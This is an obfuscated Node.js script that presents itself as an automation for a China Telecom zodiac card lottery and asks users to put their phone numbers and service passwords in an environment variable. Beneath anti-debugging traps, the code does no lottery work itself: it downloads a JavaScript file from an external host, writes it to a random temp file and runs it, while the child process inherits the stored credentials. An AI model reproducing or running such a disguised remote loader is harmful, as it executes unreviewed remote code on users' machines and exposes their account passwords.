/*
电信十二生肖集卡抽奖（无兑换）

做电信十二生肖集卡活动任务的，兑换需要八点的时候到活动页面去换（正常情况下四五天就能换了）

活动路径：  APP首页--登录后--附近--点击地图--然后下拉营业厅的图标旁边有一个翻卡机会

自己设置电信的服务密码, 把 手机号#服务密码 填到变量里, 多账号&隔开:
export chinaTelecomAccount="13888888888#123456"

每天运行一次

cron: 33 6 * * *
const $ = new Env("电信十二生肖");
*/


const {
  spawn
} = require("child_process");
const {
  promisify
} = require("util");
const _d_x_0x218643 = promisify(setTimeout);
const _d_x_0x5a38ad = require("fs").promises;
const _d_x_0x22a000 = require("os");
const _d_x_0x31474d = require("path");
const _d_x_0x349636 = require("crypto");
const _d_x_0x20402f = "Zodiac";
const _d_x_0x591f32 = "电信十二生肖脚本";
const _d_x_0x16647f = "http://dxscript.test.upcdn.net/" + _d_x_0x20402f + ".js";
const _d_x_0x391656 = "http://dxscript.test.upcdn.net/" + _d_x_0x20402f + ".json";
async function _d_x_0x241e28() {
  const _0x4385da = {};
  _0x4385da.FusKG = "debu";
  _0x4385da.xzpcT = "action";
  _0x4385da.uxVuy = "function *\\( *\\)";
  _0x4385da.yryKe = "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)";
  _0x4385da.JuzWt = function (_0x4ea48d, _0x5a7920) {
    return _0x4ea48d + _0x5a7920;
  };
  _0x4385da.czbBq = "chain";
  _0x4385da.Yruvf = "input";
  _0x4385da.ImQKy = function (_0xa58d7f) {
    return _0xa58d7f();
  };
  _0x4385da.wKNTr = function (_0x458c08, _0x5c50f6) {
    return _0x458c08 === _0x5c50f6;
  };
  _0x4385da.QaxLF = "SVJoW";
  _0x4385da.pijrT = function (_0x361b4d, _0x2e61f1) {
    return _0x361b4d(_0x2e61f1);
  };
  _0x4385da.nRFPJ = "bCPNG";
  _0x4385da.QXHSl = function (_0x59d053, _0x3bd0b1) {
    return _0x59d053 !== _0x3bd0b1;
  };
  _0x4385da.gWbDe = "lCpvl";
  _0x4385da.EClsU = "trTZd";
  _0x4385da.ZNLez = "return /\" + this + \"/";
  _0x4385da.KzGpg = "^([^ ]+( +[^ ]+)+)+[^ ]}";
  _0x4385da.frjdE = function (_0x202a4d, _0x1ebb2f) {
    return _0x202a4d === _0x1ebb2f;
  };
  _0x4385da.JOaMi = function (_0x1b2666, _0x1fef65) {
    return _0x1b2666 + _0x1fef65;
  };
  _0x4385da.zLXsE = function (_0x2d5b3e, _0x385094, _0x22500b) {
    return _0x2d5b3e(_0x385094, _0x22500b);
  };
  _0x4385da.ZTSaR = function (_0x26d5f9, _0x5697c5) {
    return _0x26d5f9 !== _0x5697c5;
  };
  _0x4385da.wxtxf = "rfWOX";
  _0x4385da.FmFRq = "oFdRa";
  _0x4385da.Itbip = "ItRtH";
  _0x4385da.Xtqjz = "init";
  _0x4385da.BEXfW = function (_0xdeb587, _0x235305) {
    return _0xdeb587(_0x235305);
  };
  _0x4385da.PQqbL = function (_0x3f9fe1, _0x51b95e) {
    return _0x3f9fe1 !== _0x51b95e;
  };
  _0x4385da.sdNqk = "tVBRM";
  _0x4385da.pVoPT = "外部脚本执行完成";
  _0x4385da.QJIju = function (_0x219c4f, _0x237982, _0x69e855) {
    return _0x219c4f(_0x237982, _0x69e855);
  };
  _0x4385da.sTQyq = function (_0x245d3e) {
    return _0x245d3e();
  };
  _0x4385da.HPXnY = "got";
  _0x4385da.YlkzS = function (_0x3fc358, _0x86fa2) {
    return _0x3fc358 !== _0x86fa2;
  };
  _0x4385da.owYIn = "wqmvR";
  _0x4385da.DwtHt = "自己设置电信的服务密码, 把 手机号#服务密码 填到变量里, 多账号&隔开: \n export chinaTelecomAccount=\"13888888888#123456\"";
  _0x4385da.CJCgq = "module";
  _0x4385da.grFWa = function (_0x1eede7, _0xb56931, _0x139afa) {
    return _0x1eede7(_0xb56931, _0x139afa);
  };
  _0x4385da.OgDpZ = "close";
  const _0x1b9e7b = _0x4385da;
  const _0x40cac1 = function () {
    const _0x105ae7 = {};
    _0x105ae7.LPLmj = _0x1b9e7b.uxVuy;
    _0x105ae7.MiAsm = _0x1b9e7b.yryKe;
    _0x105ae7.lDcfk = function (_0x4bed82, _0x4dbd2a) {
      return _0x1b9e7b.JuzWt(_0x4bed82, _0x4dbd2a);
    };
    _0x105ae7.xyOHC = _0x1b9e7b.czbBq;
    _0x105ae7.JhHag = _0x1b9e7b.Yruvf;
    _0x105ae7.XwkTp = function (_0x569066) {
      return _0x1b9e7b.ImQKy(_0x569066);
    };
    _0x105ae7.mxUOI = function (_0x5949e4, _0x4814b7) {
      return _0x1b9e7b.wKNTr(_0x5949e4, _0x4814b7);
    };
    _0x105ae7.iFYqR = "DDpgi";
    _0x105ae7.ihBnp = _0x1b9e7b.QaxLF;
    _0x105ae7.kHTEd = "jFiOs";
    _0x105ae7.CEfZc = function (_0x186fe2, _0x304b6a) {
      return _0x1b9e7b.pijrT(_0x186fe2, _0x304b6a);
    };
    _0x105ae7.yvYNd = "dcUmn";
    _0x105ae7.nqwFK = _0x1b9e7b.nRFPJ;
    const _0x18008c = _0x105ae7;
    if (_0x1b9e7b.QXHSl(_0x1b9e7b.gWbDe, _0x1b9e7b.EClsU)) {
      let _0xca212 = true;
      return function (_0x1dfac, _0x2ae0f6) {
        const _0x1fa607 = {};
        _0x1fa607.jICXk = function (_0x1c6e00, _0x528b31) {
          return _0x18008c.CEfZc(_0x1c6e00, _0x528b31);
        };
        const _0x46a530 = _0x1fa607;
        if (_0x18008c.yvYNd === _0x18008c.nqwFK) {
          const _0x3d1dd4 = new RegExp(_0x18008c.LPLmj);
          const _0x24be8b = new RegExp(_0x18008c.MiAsm, "i");
          const _0x55c2ef = _d_x_0x19dd61("init");
          if (!_0x3d1dd4.test(_0x18008c.lDcfk(_0x55c2ef, _0x18008c.xyOHC)) || !_0x24be8b.test(_0x18008c.lDcfk(_0x55c2ef, _0x18008c.JhHag))) {
            _0x55c2ef("0");
          } else {
            _0x18008c.XwkTp(_d_x_0x19dd61);
          }
        } else {
          const _0x36fbc0 = _0xca212 ? function () {
            if (_0x18008c.mxUOI(_0x18008c.iFYqR, _0x18008c.ihBnp)) {
              _0x46a530.jICXk(result, "0");
            } else {
              if (_0x2ae0f6) {
                if (_0x18008c.kHTEd !== "jFiOs") {
                  return true;
                } else {
                  const _0x48d310 = _0x2ae0f6.apply(_0x1dfac, arguments);
                  _0x2ae0f6 = null;
                  return _0x48d310;
                }
              }
            }
          } : function () {};
          _0xca212 = false;
          return _0x36fbc0;
        }
      };
    } else {
      (function () {
        return true;
      }).constructor(_0x1b9e7b.FusKG + "gger").call(_0x1b9e7b.xzpcT);
    }
  }();
  const _0x386d36 = _0x1b9e7b.QJIju(_0x40cac1, this, function () {
    const _0x142ffd = function () {
      const _0x45f8e6 = _0x142ffd.constructor(_0x1b9e7b.ZNLez)().compile(_0x1b9e7b.KzGpg);
      return !_0x45f8e6.test(_0x386d36);
    };
    return _0x142ffd();
  });
  _0x1b9e7b.sTQyq(_0x386d36);
  const _0x367e6f = function () {
    const _0x2492a4 = {};
    _0x2492a4.KiyYv = function (_0x113c9f, _0x4c5d54) {
      return _0x1b9e7b.frjdE(_0x113c9f, _0x4c5d54);
    };
    _0x2492a4.EluZP = "RFyGy";
    _0x2492a4.SKevw = "FOOWT";
    _0x2492a4.eJnOB = _0x1b9e7b.uxVuy;
    _0x2492a4.zdeRR = _0x1b9e7b.yryKe;
    _0x2492a4.gYHKx = function (_0x4594c7, _0x30652f) {
      return _0x4594c7(_0x30652f);
    };
    _0x2492a4.fFkLi = _0x1b9e7b.czbBq;
    _0x2492a4.fYhzf = function (_0x3b5631, _0x45a399) {
      return _0x1b9e7b.JOaMi(_0x3b5631, _0x45a399);
    };
    _0x2492a4.sMuoN = _0x1b9e7b.Yruvf;
    _0x2492a4.ADWNB = function (_0x45e2cd, _0x455802) {
      return _0x1b9e7b.pijrT(_0x45e2cd, _0x455802);
    };
    _0x2492a4.aZKZG = function (_0xd5fb35) {
      return _0xd5fb35();
    };
    _0x2492a4.GREDz = function (_0x3c35c5, _0x2d135a, _0x559733) {
      return _0x1b9e7b.zLXsE(_0x3c35c5, _0x2d135a, _0x559733);
    };
    _0x2492a4.rvtHZ = function (_0x4825e1, _0x2152fe) {
      return _0x1b9e7b.ZTSaR(_0x4825e1, _0x2152fe);
    };
    _0x2492a4.lPWZf = _0x1b9e7b.wxtxf;
    _0x2492a4.brEkS = _0x1b9e7b.FmFRq;
    const _0xf2c671 = _0x2492a4;
    if (_0x1b9e7b.ZTSaR(_0x1b9e7b.Itbip, "ItRtH")) {
      _0x1b9e7b.pijrT(debuggerProtection, 0);
    } else {
      let _0x8197ab = true;
      return function (_0x5aa604, _0x6fb86b) {
        const _0x4e3bdb = {};
        _0x4e3bdb.LAsKa = "return /\" + this + \"/";
        _0x4e3bdb.jmowg = "^([^ ]+( +[^ ]+)+)+[^ ]}";
        _0x4e3bdb.eaEeH = function (_0x134483, _0xd19fdb) {
          return _0xf2c671.KiyYv(_0x134483, _0xd19fdb);
        };
        _0x4e3bdb.kHguF = "haEJS";
        _0x4e3bdb.GrcFL = _0xf2c671.EluZP;
        _0x4e3bdb.ggFhk = _0xf2c671.SKevw;
        _0x4e3bdb.bIebM = _0xf2c671.eJnOB;
        _0x4e3bdb.DnnUw = _0xf2c671.zdeRR;
        _0x4e3bdb.ctroI = function (_0x4e3efb, _0x146dfa) {
          return _0xf2c671.gYHKx(_0x4e3efb, _0x146dfa);
        };
        _0x4e3bdb.gJdBL = "init";
        _0x4e3bdb.JUkLp = function (_0x294362, _0x27d074) {
          return _0x294362 + _0x27d074;
        };
        _0x4e3bdb.fOXFQ = _0xf2c671.fFkLi;
        _0x4e3bdb.JdvAw = function (_0x142175, _0x290062) {
          return _0xf2c671.fYhzf(_0x142175, _0x290062);
        };
        _0x4e3bdb.VrMxT = _0xf2c671.sMuoN;
        _0x4e3bdb.Wfgwr = function (_0x9c8559, _0x5bbaf0) {
          return _0xf2c671.ADWNB(_0x9c8559, _0x5bbaf0);
        };
        _0x4e3bdb.rJZQE = function (_0x1e07c0) {
          return _0xf2c671.aZKZG(_0x1e07c0);
        };
        _0x4e3bdb.fEAyy = function (_0x11e4b3, _0xe5dbe8, _0x11dfdc) {
          return _0xf2c671.GREDz(_0x11e4b3, _0xe5dbe8, _0x11dfdc);
        };
        const _0xa06f02 = _0x4e3bdb;
        if (_0xf2c671.rvtHZ(_0xf2c671.lPWZf, _0xf2c671.brEkS)) {
          const _0x507257 = _0x8197ab ? function () {
            const _0x44a58c = {};
            _0x44a58c.EAcak = _0xa06f02.LAsKa;
            _0x44a58c.bFzNc = _0xa06f02.jmowg;
            const _0x5aa795 = _0x44a58c;
            if (_0xa06f02.eaEeH(_0xa06f02.kHguF, _0xa06f02.kHguF)) {
              if (_0x6fb86b) {
                if (_0xa06f02.GrcFL !== _0xa06f02.ggFhk) {
                  const _0x4500b1 = _0x6fb86b.apply(_0x5aa604, arguments);
                  _0x6fb86b = null;
                  return _0x4500b1;
                } else {
                  const _0x2eb94a = test.constructor(_0x5aa795.EAcak)().compile(_0x5aa795.bFzNc);
                  return !_0x2eb94a.test(_0x386d36);
                }
              }
            } else {
              console.log("" + data);
            }
          } : function () {};
          _0x8197ab = false;
          return _0x507257;
        } else {
          _0xa06f02.fEAyy(_0x367e6f, this, function () {
            const _0x2650e9 = new RegExp(_0xa06f02.bIebM);
            const _0x2e51cb = new RegExp(_0xa06f02.DnnUw, "i");
            const _0x21ac25 = _0xa06f02.ctroI(_d_x_0x19dd61, _0xa06f02.gJdBL);
            if (!_0x2650e9.test(_0xa06f02.JUkLp(_0x21ac25, _0xa06f02.fOXFQ)) || !_0x2e51cb.test(_0xa06f02.JdvAw(_0x21ac25, _0xa06f02.VrMxT))) {
              _0xa06f02.Wfgwr(_0x21ac25, "0");
            } else {
              _0xa06f02.rJZQE(_d_x_0x19dd61);
            }
          })();
        }
      };
    }
  }();
  (function () {
    if (_0x1b9e7b.PQqbL(_0x1b9e7b.sdNqk, _0x1b9e7b.sdNqk)) {
      if (fn) {
        const _0x442830 = fn.apply(context, arguments);
        fn = null;
        return _0x442830;
      }
    } else {
      _0x367e6f(this, function () {
        const _0x4b6565 = new RegExp(_0x1b9e7b.uxVuy);
        const _0xbc608d = new RegExp(_0x1b9e7b.yryKe, "i");
        const _0x23a478 = _0x1b9e7b.pijrT(_d_x_0x19dd61, _0x1b9e7b.Xtqjz);
        if (!_0x4b6565.test(_0x23a478 + _0x1b9e7b.czbBq) || !_0xbc608d.test(_0x1b9e7b.JOaMi(_0x23a478, _0x1b9e7b.Yruvf))) {
          _0x1b9e7b.BEXfW(_0x23a478, "0");
        } else {
          _d_x_0x19dd61();
        }
      })();
    }
  })();
  try {
    const _0x1f9dc2 = await import(_0x1b9e7b.HPXnY);
    const _0x8f315f = await _0x1f9dc2.default(_d_x_0x391656).json();
    const _0x4d88ce = _0x8f315f;
    if (_0x1b9e7b.YlkzS(_0x4d88ce.status, 1)) {
      if (_0x1b9e7b.frjdE(_0x1b9e7b.owYIn, "wqmvR")) {
        console.log("脚本已停用，有缘再见");
        await _d_x_0x218643(5000);
        process.exit(0);
      } else {
        const _0x39657a = fn.apply(context, arguments);
        fn = null;
        return _0x39657a;
      }
    } else {
      const _0x4e81be = await _0x1f9dc2.default(_d_x_0x16647f);
      const _0x1e6845 = _0x4e81be.body;
      const _0x1a57af = _0x1b9e7b.DwtHt;
      console.log("你正在运行" + _d_x_0x591f32 + "\n\n" + _0x1a57af);
      console.log(_0x4d88ce.updata);
      console.log("\n\n");
      const _0x5dd392 = _d_x_0x349636.randomBytes(16).toString("hex");
      const _0x189514 = _0x5dd392 + ".js";
      const _0x1a4124 = _d_x_0x31474d.join(_d_x_0x22a000.tmpdir(), _0x189514);
      await _d_x_0x5a38ad.writeFile(_0x1a4124, _0x1e6845);
      const _0x52bf98 = _d_x_0x31474d.resolve(__dirname, "node_modules");
      process.env.NODE_PATH = _0x52bf98;
      _0x1b9e7b.BEXfW(require, _0x1b9e7b.CJCgq).Module._initPaths();
      const _0x189e08 = _0x1b9e7b.grFWa(spawn, "node", [_0x1a4124]);
      _0x189e08.stdout.on("data", _0x2ad71f => {
        console.log("" + _0x2ad71f);
      });
      _0x189e08.stderr.on("data", _0x9bfcbf => {
        console.error("" + _0x9bfcbf);
      });
      _0x189e08.on(_0x1b9e7b.OgDpZ, _0x4f8f69 => {
        console.log(_0x1b9e7b.pVoPT);
      });
    }
  } catch (_0x5cdc33) {
    console.error("发生错误: " + _0x5cdc33.message);
    console.error(_0x5cdc33.stack);
  }
}
_d_x_0x241e28();
function _d_x_0x19dd61(_0x31dd26) {
  const _0x32e710 = {};
  _0x32e710.EKONv = "kljFT";
  _0x32e710.EngYi = "nmSvl";
  _0x32e710.mjQoN = function (_0x4fb272) {
    return _0x4fb272();
  };
  _0x32e710.gsGsj = "外部脚本执行完成";
  _0x32e710.LShmJ = "DPvPe";
  _0x32e710.ZSFrA = function (_0x454508, _0x4612c8) {
    return _0x454508 === _0x4612c8;
  };
  _0x32e710.aZCrR = "string";
  _0x32e710.ZFdvt = "while (true) {}";
  _0x32e710.PevZP = "counter";
  _0x32e710.zbvFx = "GGozL";
  _0x32e710.ewTOd = "length";
  _0x32e710.rGIJK = function (_0x4be1f3, _0x358ca6) {
    return _0x4be1f3 === _0x358ca6;
  };
  _0x32e710.nKrzQ = function (_0x2a5703, _0x53cebc) {
    return _0x2a5703 % _0x53cebc;
  };
  _0x32e710.tzYxy = "InOCv";
  _0x32e710.bXniu = "debu";
  _0x32e710.bcUpu = "gger";
  _0x32e710.wYAXL = "action";
  _0x32e710.DGVTl = "return /\" + this + \"/";
  _0x32e710.XYTSH = "^([^ ]+( +[^ ]+)+)+[^ ]}";
  _0x32e710.FNvOW = "mVjKE";
  _0x32e710.KVCEs = "UQQLP";
  _0x32e710.GoSnX = "Nbdis";
  _0x32e710.STofL = function (_0x17a50d, _0x52986c) {
    return _0x17a50d(_0x52986c);
  };
  const _0x328c6e = _0x32e710;
  function _0x398d74(_0x1dd544) {
    const _0x11ca58 = {};
    _0x11ca58.dsKyw = _0x328c6e.gsGsj;
    _0x11ca58.sLKVh = function (_0x4b6d46, _0x5e8d54) {
      return _0x4b6d46 === _0x5e8d54;
    };
    _0x11ca58.fFCId = _0x328c6e.LShmJ;
    const _0x5f22cd = _0x11ca58;
    if (_0x328c6e.ZSFrA(typeof _0x1dd544, _0x328c6e.aZCrR)) {
      return function (_0x54a0b3) {}.constructor(_0x328c6e.ZFdvt).apply(_0x328c6e.PevZP);
    } else {
      if (_0x328c6e.zbvFx === _0x328c6e.zbvFx) {
        if (("" + _0x1dd544 / _0x1dd544)[_0x328c6e.ewTOd] !== 1 || _0x328c6e.rGIJK(_0x328c6e.nKrzQ(_0x1dd544, 20), 0)) {
          if ("InOCv" !== _0x328c6e.tzYxy) {
            console.log(_0x5f22cd.dsKyw);
          } else {
            (function () {
              if (_0x328c6e.EKONv !== _0x328c6e.EngYi) {
                return true;
              } else {
                const _0x2e1607 = firstCall ? function () {
                  if (fn) {
                    const _0xd062f7 = fn.apply(context, arguments);
                    fn = null;
                    return _0xd062f7;
                  }
                } : function () {};
                firstCall = false;
                return _0x2e1607;
              }
            }).constructor(_0x328c6e.bXniu + _0x328c6e.bcUpu).call(_0x328c6e.wYAXL);
          }
        } else {
          (function () {
            if (_0x5f22cd.sLKVh(_0x5f22cd.fFCId, "fsrBr")) {
              console.error("发生错误: " + error.message);
              console.error(error.stack);
            } else {
              return false;
            }
          }).constructor("debugger").apply("stateObject");
        }
      } else {
        _0x328c6e.mjQoN(_d_x_0x19dd61);
      }
    }
    _0x398d74(++_0x1dd544);
  }
  try {
    if (_0x328c6e.rGIJK("UNzXu", "UNzXu")) {
      if (_0x31dd26) {
        if (_0x328c6e.FNvOW !== _0x328c6e.KVCEs) {
          return _0x398d74;
        } else {
          if (fn) {
            const _0x119ac0 = fn.apply(context, arguments);
            fn = null;
            return _0x119ac0;
          }
        }
      } else {
        if (_0x328c6e.rGIJK(_0x328c6e.GoSnX, "rKwcO")) {
          const _0x66512 = function () {
            const _0x2c4ce0 = _0x66512.constructor(_0x328c6e.DGVTl)().compile(_0x328c6e.XYTSH);
            return !_0x2c4ce0.test(_0x3126e4);
          };
          return _0x328c6e.mjQoN(_0x66512);
        } else {
          _0x328c6e.STofL(_0x398d74, 0);
        }
      }
    } else {
      return false;
    }
  } catch (_0x5d0784) {}
}